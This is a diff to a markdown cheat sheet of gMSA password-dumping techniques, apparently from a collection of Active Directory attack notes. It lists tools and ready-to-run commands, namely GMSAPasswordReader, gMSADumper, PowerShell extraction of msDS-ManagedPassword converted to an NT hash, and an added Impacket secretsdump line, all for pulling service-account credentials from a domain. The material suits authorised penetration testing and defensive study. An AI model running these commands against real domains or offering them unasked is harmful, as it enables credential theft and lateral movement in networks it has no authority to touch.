@@ -25,20 +25,24 @@
 
 #### 1) GMSAPasswordReader (C#) https://github.com/rvazarkar/GMSAPasswordReader
 
- - GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
+    GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
 
 #### 2) gMSADumper (Python) https://github.com/micahvandeusen/gMSADumper
 
- - python3 gMSADumper.py -u User -p Password1 -d domain.local
+    python3 gMSADumper.py -u User -p Password1 -d domain.local
 
 #### 3) Active Directory Powershell
 
- - $gmsa = Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-
+    $gmsa = Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-
  
- - $blob = $gmsa.'msDS-ManagedPassword'
+    $blob = $gmsa.'msDS-ManagedPassword'
  
- - $mp = ConvertFrom-ADManagedPasswordBlob $blob
+    $mp = ConvertFrom-ADManagedPasswordBlob $blob
  
- - $hash1 = ConvertTo-NTHash -Password $mp.SecureCurrentPassword
+    $hash1 = ConvertTo-NTHash -Password $mp.SecureCurrentPassword
 
 #### 4) gMSA_Permissions_Collection.ps1 based on Active Directory PowerShell module
+
+#### 5) Impacket
+
+    Impacket-secretsdump domain.local/USER1:Password@1@DC_IP | grep GMSA
